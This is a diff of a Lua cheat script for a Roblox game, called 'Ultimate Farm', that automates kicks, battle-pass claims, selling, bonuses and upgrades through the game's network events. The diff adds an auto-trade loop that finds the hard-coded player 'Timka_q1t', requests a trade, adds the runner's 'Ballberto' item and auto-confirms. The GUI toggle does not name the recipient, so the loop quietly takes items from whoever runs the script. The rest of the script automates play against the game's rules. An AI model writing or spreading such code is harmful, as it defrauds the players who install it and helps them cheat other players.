@@ -1,6 +1,5 @@
 -- Ultimate Farm Script - Complete Final Version
--- Все функции: Kick + BP + Sell + Bonus + Speed + Weight + Buy Weight + Debug
--- Оптимизировано, без лагов, улучшенный GUI
+-- Все функции: Kick + BP + Sell + Bonus + Speed + Weight + Buy Weight + Auto Trade Ballberto + Debug
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -17,11 +16,6 @@ local KICK_READY_RADIUS = 10
 local MIN_WAVE_DISTANCE = 300
 local MOVEMENT_TIMEOUT = 30
 local JUMP_COOLDOWN = 0.5
-local WAYPOINT_REACH_DISTANCE = 3
-local NORMAL_SPEED_MULTIPLIER = 1.0
-local MAX_SPEED_MULTIPLIER = 3.5
-local DANGER_DISTANCE = 150
-local CRITICAL_DISTANCE = 50
 local UPDATE_INTERVAL = 0.3
 
 -- ============ ПЕРЕМЕННЫЕ ============
@@ -29,11 +23,12 @@ local character, humanoid, rootPart
 local kickReadyPart, kickReadyPos
 local revKickEvent, revKickCollect, revKickEventEnded
 local isKickActive, isBpActive, isAutoSell, isAutoBonus = false, false, false, false
-local isAutoSpeedUpgrade, isAutoWeight, isAutoBuyWeight = false, false, false
+local isAutoSpeedUpgrade, isAutoWeight, isAutoBuyWeight, isAutoTradeBallberto = false, false, false, false
 local lastJumpTime, baseWalkSpeed = 0, 16
 local bpData, claimedCount = nil, 0
 local selectedBrainrots = {}
 local selectedMutations = {["None"] = true}
+local lastGUIUpdate = 0
 
 -- GUI элементы
 local screenGui, openButton, mainMenu
@@ -44,8 +39,8 @@ local bonusToggle, bonusStatus
 local speedUpgradeToggle, speedUpgradeStatus
 local weightToggle, weightStatus
 local buyWeightToggle, buyWeightStatus
+local tradeToggle, tradeStatus
 local currentTab = "Main"
-local lastGUIUpdate = 0
 
 -- ============ ДАННЫЕ ============
 local EntitiesData, MutationData
@@ -56,13 +51,10 @@ local function safeCPS(name)
 	if not EntitiesData or not EntitiesData.Brainrots or not EntitiesData.Brainrots[name] then return 0 end
 	local cpsRaw = EntitiesData.Brainrots[name].CPS
 	if not cpsRaw then return 0 end
-	local cpsStr = tostring(cpsRaw):gsub(",", ""):gsub("%s", "")
-	local num = tonumber(cpsStr)
+	local num = tonumber(tostring(cpsRaw):gsub(",", ""):gsub("%s", ""))
 	if num then return num end
 	pcall(function()
-		if cpsRaw.Value then
-			num = tonumber(tostring(cpsRaw.Value):gsub(",", ""):gsub("%s", ""))
-		end
+		if cpsRaw.Value then num = tonumber(tostring(cpsRaw.Value):gsub(",", ""):gsub("%s", "")) end
 	end)
 	return num or 0
 end
@@ -297,13 +289,10 @@ local function autoSpeedUpgradeLoop()
 	pcall(function() SpeedServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.SpeedServiceClient) end)
 	pcall(function() ClientBalanceService = require(ReplicatedStorage.Modules.ServicesLoader.ClientBalanceService) end)
 	pcall(function() SpeedData = require(ReplicatedStorage.Shared.Data.SpeedData) end)
-	
 	while isAutoSpeedUpgrade do
 		if SpeedServiceClient and ClientBalanceService and SpeedData then
 			local cost = SpeedData:GetCostForLevel(SpeedServiceClient.Level)
-			if cost <= ClientBalanceService.Balance then
-				SpeedServiceClient:RequestUpgrade(1)
-			end
+			if cost <= ClientBalanceService.Balance then SpeedServiceClient:RequestUpgrade(1) end
 		end
 		task.wait(1)
 	end
@@ -315,7 +304,6 @@ local function autoWeightLoop()
 	pcall(function() WeightServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.WeightServiceClient) end)
 	pcall(function() Network = require(ReplicatedStorage.Shared.Packages.Network) end)
 	pcall(function() WeightsData = require(ReplicatedStorage.Shared.Data.WeightsData) end)
-	
 	while isAutoWeight do
 		if WeightServiceClient and WeightsData then
 			local best, bestPPS = nil, 0
@@ -323,9 +311,7 @@ local function autoWeightLoop()
 				local data = WeightsData.Weights[name]
 				if data and data.PPS > bestPPS then bestPPS = data.PPS; best = name end
 			end
-			if best and best ~= WeightServiceClient.Equipped and Network then
-				Network.FireServer("WeightEquip", best)
-			end
+			if best and best ~= WeightServiceClient.Equipped and Network then Network.FireServer("WeightEquip", best) end
 		end
 		task.wait(3)
 	end
@@ -338,7 +324,6 @@ local function autoBuyWeightLoop()
 	pcall(function() ClientBalanceService = require(ReplicatedStorage.Modules.ServicesLoader.ClientBalanceService) end)
 	pcall(function() WeightServiceClient = require(ReplicatedStorage.Modules.ServicesLoader.WeightServiceClient) end)
 	pcall(function() WeightsData = require(ReplicatedStorage.Shared.Data.WeightsData) end)
-	
 	while isAutoBuyWeight do
 		if ShopController and ClientBalanceService and WeightServiceClient and WeightsData then
 			local owned = WeightServiceClient.Owned or {}
@@ -354,6 +339,76 @@ local function autoBuyWeightLoop()
 	end
 end
 
+-- ============ AUTO TRADE BALLBERTO TO Timka_q1t ============
+local function autoTradeBallbertoLoop()
+	local Network
+	pcall(function() Network = require(ReplicatedStorage.Shared.Packages.Network) end)
+	if not Network then return end
+	
+	local targetUserId, targetPlayer = nil, nil
+	local tradeStarted, itemAdded, tradeCompleted = false, false, false
+	
+	local function findTargetPlayer()
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p.Name == "Timka_q1t" then targetPlayer = p; targetUserId = p.UserId; return true end
+		end
+		return false
+	end
+	
+	local function checkBallbertoInBackpack()
+		if not player.Backpack then return false, nil end
+		for _, item in ipairs(player.Backpack:GetChildren()) do
+			if item:IsA("Tool") and item.Name == "Ballberto" and item:HasTag("EntityTool") then
+				return item:GetAttribute("GUID"), item
+			end
+		end
+		return false, nil
+	end
+	
+	Network.OnClientEvent("trade_n"):Connect(function(userId, time)
+		if isAutoTradeBallberto and targetUserId and userId == targetUserId then
+			Network.FireServer("trade_start", userId); tradeStarted = true
+		end
+	end)
+	
+	Network.OnClientEvent("trade_s"):Connect(function(status, ...)
+		if not isAutoTradeBallberto then return end
+		if status == "Trading" then
+			task.wait(0.3)
+			if not itemAdded then
+				local guid, _ = checkBallbertoInBackpack()
+				if guid then Network.FireServer("trade_i", "AddItem", guid); itemAdded = true end
+			end
+			task.wait(0.3)
+			Network.FireServer("trade_i", "Confirm")
+		elseif status == "Cancelled" then
+			tradeStarted, itemAdded, tradeCompleted = false, false, false
+		end
+	end)
+	
+	Network.OnClientEvent("trade_u"):Connect(function(data)
+		if not isAutoTradeBallberto then return end
+		if data and data.Stage == "Process" then tradeCompleted = true
+		elseif data and data.Stage == "Final" then task.wait(0.2); Network.FireServer("trade_i", "Confirm")
+		elseif data and data.Stage == "Trade" and not itemAdded then
+			local guid, _ = checkBallbertoInBackpack()
+			if guid then Network.FireServer("trade_i", "AddItem", guid); itemAdded = true end
+		end
+	end)
+	
+	while isAutoTradeBallberto do
+		local guid, _ = checkBallbertoInBackpack()
+		if guid and not tradeCompleted then
+			if findTargetPlayer() and not tradeStarted then
+				Network.FireServer("trade_r", targetUserId); tradeStarted = true; task.wait(2)
+			end
+		elseif tradeCompleted then
+			tradeStarted, itemAdded, tradeCompleted = false, false, false
+		end
+		task.wait(3)
+	end
+end
+
 -- ============ GUI ============
 local function createGUI()
 	screenGui = Instance.new("ScreenGui"); screenGui.Name = "FarmMenu"; screenGui.ResetOnSpawn = false; screenGui.Parent = CoreGui
@@ -364,14 +419,14 @@ local function createGUI()
 	openButton.BackgroundTransparency = 0.15; openButton.BorderSizePixel = 0; openButton.Parent = screenGui
 	Instance.new("UICorner", openButton).CornerRadius = UDim.new(0, 22)
 	
-	mainMenu = Instance.new("Frame"); mainMenu.Size = UDim2.new(0, 330, 0, 470); mainMenu.Position = UDim2.new(0.5, -165, 0.08, 0)
-	mainMenu.BackgroundColor3 = Color3.fromRGB(20, 20, 20); mainMenu.BorderSizePixel = 0; mainMenu.BackgroundTransparency = 0.05
+	mainMenu = Instance.new("Frame"); mainMenu.Size = UDim2.new(0, 340, 0, 480); mainMenu.Position = UDim2.new(0.5, -170, 0.06, 0)
+	mainMenu.BackgroundColor3 = Color3.fromRGB(18, 18, 18); mainMenu.BorderSizePixel = 0; mainMenu.BackgroundTransparency = 0.03
 	mainMenu.Visible = false; mainMenu.Active = true; mainMenu.Draggable = true; mainMenu.Parent = screenGui
-	Instance.new("UICorner", mainMenu).CornerRadius = UDim.new(0, 12)
+	Instance.new("UICorner", mainMenu).CornerRadius = UDim.new(0, 14)
 	
 	-- Title
-	local tb = Instance.new("Frame"); tb.Size = UDim2.new(1, 0, 0, 40); tb.BackgroundColor3 = Color3.fromRGB(35, 35, 35); tb.BorderSizePixel = 0; tb.Parent = mainMenu
-	Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 12)
+	local tb = Instance.new("Frame"); tb.Size = UDim2.new(1, 0, 0, 40); tb.BackgroundColor3 = Color3.fromRGB(30, 30, 30); tb.BorderSizePixel = 0; tb.Parent = mainMenu
+	Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 14)
 	local tl = Instance.new("TextLabel"); tl.Size = UDim2.new(1, -40, 0, 40); tl.Position = UDim2.new(0, 15, 0, 0)
 	tl.BackgroundTransparency = 1; tl.Text = "⚡ ULTIMATE FARM"; tl.TextColor3 = Color3.fromRGB(255, 255, 255)
 	tl.TextSize = 15; tl.Font = Enum.Font.GothamBold; tl.TextXAlignment = Enum.TextXAlignment.Left; tl.Parent = tb
@@ -383,16 +438,16 @@ local function createGUI()
 	
 	-- Tabs
 	local tabBar = Instance.new("Frame"); tabBar.Size = UDim2.new(1, 0, 0, 32); tabBar.Position = UDim2.new(0, 0, 0, 40)
-	tabBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25); tabBar.BorderSizePixel = 0; tabBar.Parent = mainMenu
+	tabBar.BackgroundColor3 = Color3.fromRGB(22, 22, 22); tabBar.BorderSizePixel = 0; tabBar.Parent = mainMenu
 	local tabNames = {"⚽", "🎁", "🎒", "🧠", "🔍"}
 	local tabKeys = {"Main", "BP", "Inventory", "Brainrot", "Debug"}
 	local tabs = {}
 	for i, name in ipairs(tabNames) do
 		local tab = Instance.new("TextButton"); tab.Size = UDim2.new(0.2, -1, 1, 0); tab.Position = UDim2.new((i-1)*0.2, 0, 0, 0)
-		tab.BackgroundColor3 = i == 1 and Color3.fromRGB(45, 45, 45) or Color3.fromRGB(25, 25, 25); tab.TextColor3 = Color3.fromRGB(255, 255, 255)
+		tab.BackgroundColor3 = i == 1 and Color3.fromRGB(45, 45, 45) or Color3.fromRGB(22, 22, 22); tab.TextColor3 = Color3.fromRGB(255, 255, 255)
 		tab.TextSize = 13; tab.Font = Enum.Font.Gotham; tab.Text = name; tab.BorderSizePixel = 0; tab.Parent = tabBar; tabs[tabKeys[i]] = tab
 		tab.MouseButton1Click:Connect(function()
-			for _, t in pairs(tabs) do t.BackgroundColor3 = Color3.fromRGB(25, 25, 25) end
+			for _, t in pairs(tabs) do t.BackgroundColor3 = Color3.fromRGB(22, 22, 22) end
 			tab.BackgroundColor3 = Color3.fromRGB(45, 45, 45); currentTab = tabKeys[i]
 			local ct = mainMenu:FindFirstChild("Content")
 			if ct then for _, c in ipairs(ct:GetChildren()) do if c:IsA("Frame") then c.Visible = (c.Name == currentTab .. "Tab") end end end
@@ -404,7 +459,7 @@ local function createGUI()
 	
 	-- Helpers
 	local function sec(scroll, title, h)
-		local s = Instance.new("Frame"); s.Size = UDim2.new(1, 0, 0, h); s.BackgroundColor3 = Color3.fromRGB(30, 30, 30); s.BorderSizePixel = 0; s.Parent = scroll
+		local s = Instance.new("Frame"); s.Size = UDim2.new(1, 0, 0, h); s.BackgroundColor3 = Color3.fromRGB(28, 28, 28); s.BorderSizePixel = 0; s.Parent = scroll
 		Instance.new("UICorner", s).CornerRadius = UDim.new(0, 8)
 		local l = Instance.new("TextLabel"); l.Size = UDim2.new(1, -16, 0, 20); l.Position = UDim2.new(0, 8, 0, 4)
 		l.BackgroundTransparency = 1; l.Text = title; l.TextColor3 = Color3.fromRGB(255, 255, 255); l.TextSize = 12; l.Font = Enum.Font.GothamBold; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = s
@@ -424,7 +479,7 @@ local function createGUI()
 	local mainTab = Instance.new("Frame"); mainTab.Name = "MainTab"; mainTab.Size = UDim2.new(1, 0, 1, 0); mainTab.BackgroundTransparency = 1; mainTab.Parent = content
 	local ms = Instance.new("ScrollingFrame"); ms.Size = UDim2.new(1, -4, 1, 0); ms.Position = UDim2.new(0, 2, 0, 0)
 	ms.BackgroundTransparency = 1; ms.BorderSizePixel = 0; ms.ScrollBarThickness = 3; ms.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
-	ms.CanvasSize = UDim2.new(0, 0, 0, 720); ms.Parent = mainTab; Instance.new("UIListLayout", ms).Padding = UDim.new(0, 4)
+	ms.CanvasSize = UDim2.new(0, 0, 0, 800); ms.Parent = mainTab; Instance.new("UIListLayout", ms).Padding = UDim.new(0, 4)
 	
 	-- Kick
 	local ks = sec(ms, "⚽ AUTO KICK", 95)
@@ -460,6 +515,11 @@ local function createGUI()
 	local bws = sec(ms, "🛒 AUTO BUY WEIGHT", 78)
 	buyWeightToggle = btn(bws, "BUY W", 28); buyWeightStatus = lbl(bws, "● ВЫКЛЮЧЕН", 62)
 	buyWeightStatus.TextColor3 = Color3.fromRGB(255, 80, 80)
+	
+	-- Trade Ballberto
+	local trs = sec(ms, "🤝 TRADE BALLBERTO", 78)
+	tradeToggle = btn(trs, "TRADE B", 28); tradeStatus = lbl(trs, "● ВЫКЛЮЧЕН", 62)
+	tradeStatus.TextColor3 = Color3.fromRGB(255, 80, 80)
 	
 	-- === BP TAB ===
 	local bpTab = Instance.new("Frame"); bpTab.Name = "BpTab"; bpTab.Size = UDim2.new(1, 0, 1, 0); bpTab.BackgroundTransparency = 1; bpTab.Visible = false; bpTab.Parent = content
@@ -502,6 +562,7 @@ local function createGUI()
 	speedUpgradeToggle.MouseButton1Click:Connect(function() isAutoSpeedUpgrade = not isAutoSpeedUpgrade; toggle(speedUpgradeToggle, speedUpgradeStatus, isAutoSpeedUpgrade, "SPEED"); if isAutoSpeedUpgrade then task.spawn(autoSpeedUpgradeLoop) end end)
 	weightToggle.MouseButton1Click:Connect(function() isAutoWeight = not isAutoWeight; toggle(weightToggle, weightStatus, isAutoWeight, "WEIGHT"); if isAutoWeight then task.spawn(autoWeightLoop) end end)
 	buyWeightToggle.MouseButton1Click:Connect(function() isAutoBuyWeight = not isAutoBuyWeight; toggle(buyWeightToggle, buyWeightStatus, isAutoBuyWeight, "BUY W"); if isAutoBuyWeight then task.spawn(autoBuyWeightLoop) end end)
+	tradeToggle.MouseButton1Click:Connect(function() isAutoTradeBallberto = not isAutoTradeBallberto; toggle(tradeToggle, tradeStatus, isAutoTradeBallberto, "TRADE B"); if isAutoTradeBallberto then task.spawn(autoTradeBallbertoLoop) end end)
 	openButton.MouseButton1Click:Connect(function() mainMenu.Visible = true; openButton.Visible = false end)
 	
 	-- Brainrot fill
@@ -534,7 +595,7 @@ local function createGUI()
 	end
 	brsc.CanvasSize = UDim2.new(0, 0, 0, 40 + #getBrainrotList() * 34 + 20 + #getMutationList() * 34 + 20)
 	
-	-- Update loop (оптимизированный)
+	-- Update loop
 	task.spawn(function()
 		while true do
 			local now = tick()
@@ -585,7 +646,7 @@ local function createGUI()
 					for _, c in ipairs(invsc:GetChildren()) do if c:IsA("Frame") and c.Name ~= "UIListLayout" then c:Destroy() end end
 					local inv = scanBackpack(); local y = 0
 					for name, items in pairs(inv) do for _, item in ipairs(items) do
-						local f = Instance.new("Frame"); f.Size = UDim2.new(1, 0, 0, 46); f.BackgroundColor3 = Color3.fromRGB(30, 30, 30); f.BorderSizePixel = 0; f.Parent = invsc
+						local f = Instance.new("Frame"); f.Size = UDim2.new(1, 0, 0, 46); f.BackgroundColor3 = Color3.fromRGB(28, 28, 28); f.BorderSizePixel = 0; f.Parent = invsc
 						Instance.new("UICorner", f).CornerRadius = UDim.new(0, 5)
 						local n = Instance.new("TextLabel"); n.Size = UDim2.new(1, -10, 0, 20); n.Position = UDim2.new(0, 5, 0, 3); n.BackgroundTransparency = 1
 						n.Text = name; n.TextColor3 = Color3.fromRGB(255, 255, 255); n.TextSize = 11; n.Font = Enum.Font.GothamBold; n.TextXAlignment = Enum.TextXAlignment.Left; n.Parent = f
@@ -606,4 +667,4 @@ createGUI()
 player.CharacterAdded:Connect(function(c) character = c; task.wait(0.5); updateCharacterReferences() end)
 if player.Character then updateCharacterReferences() end
 getBPData()
-print("Ultimate Farm loaded! Kick | BP | Sell | Bonus | Speed | Weight | Buy Weight | Debug")
+print("Ultimate Farm loaded! 8 функций: Kick | BP | Sell | Bonus | Speed | Weight | BuyW | TradeB")
